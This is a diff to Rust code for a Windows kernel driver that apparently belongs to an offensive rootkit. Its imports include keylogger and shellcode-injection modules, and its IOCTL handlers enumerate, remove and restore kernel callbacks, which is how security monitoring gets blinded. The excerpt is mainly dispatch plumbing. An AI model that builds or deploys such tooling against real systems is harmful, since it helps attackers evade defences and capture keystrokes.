@@ -1,7 +1,7 @@
 use {
-    crate::{*,
-        callbacks::Callback, driver::Driver,
-        injection::InjectionShellcode, keylogger::set_keylogger_state, 
+    crate::{
+        *, callbacks::{Callback, CallbackRegistry, CallbackOb, CallbackList}, 
+        driver::Driver, injection::InjectionShellcode, keylogger::set_keylogger_state, 
         module::Module, process::Process, thread::Thread
     }, 
     alloc::boxed::Box, 
@@ -100,21 +100,29 @@ lazy_static! {
         ioctls.insert(IOCTL_ENUMERATE_CALLBACK, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             log::info!("Received IOCTL_ENUMERATE_CALLBACK");
             let mut information = 0;
-            let status = unsafe { handle_callback!(irp, stack, Callback::search_module, CallbackInfoInput, CallbackInfoOutput, &mut information) };
+            let status = unsafe { handle_callback!(irp, stack, CallbackInfoInput, CallbackInfoOutput, &mut information, IOCTL_ENUMERATE_CALLBACK) };
+            unsafe { (*irp).IoStatus.Information = information as u64 };
+            status
+        }) as IoctlHandler);
+
+        ioctls.insert(IOCTL_ENUMERATE_REMOVED_CALLBACK, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
+            log::info!("Received IOCTL_ENUMERATE_REMOVED_CALLBACK");
+            let mut information = 0;
+            let status = unsafe { handle_callback!(irp, stack, CallbackInfoInput, CallbackInfoOutput, &mut information, IOCTL_ENUMERATE_REMOVED_CALLBACK) };
             unsafe { (*irp).IoStatus.Information = information as u64 };
             status
         }) as IoctlHandler);
 
         ioctls.insert(IOCTL_REMOVE_CALLBACK, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             log::info!("Received IOCTL_REMOVE_CALLBACK");
-            let status = unsafe { handle_callback!(stack, Callback::remove_callback, CallbackInfoInput) };
+            let status = unsafe { handle_callback!(stack, CallbackInfoInput, IOCTL_REMOVE_CALLBACK) };
             unsafe { (*irp).IoStatus.Information = 0 };
             status
         }) as IoctlHandler);
 
         ioctls.insert(IOCTL_RESTORE_CALLBACK, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             log::info!("Received IOCTL_RESTORE_CALLBACK");
-            let status = unsafe { handle_callback!(stack, Callback::restore_callback, CallbackInfoInput) };
+            let status = unsafe { handle_callback!(stack, CallbackInfoInput, IOCTL_RESTORE_CALLBACK) };
             unsafe { (*irp).IoStatus.Information = 0 };
             status
         }) as IoctlHandler);
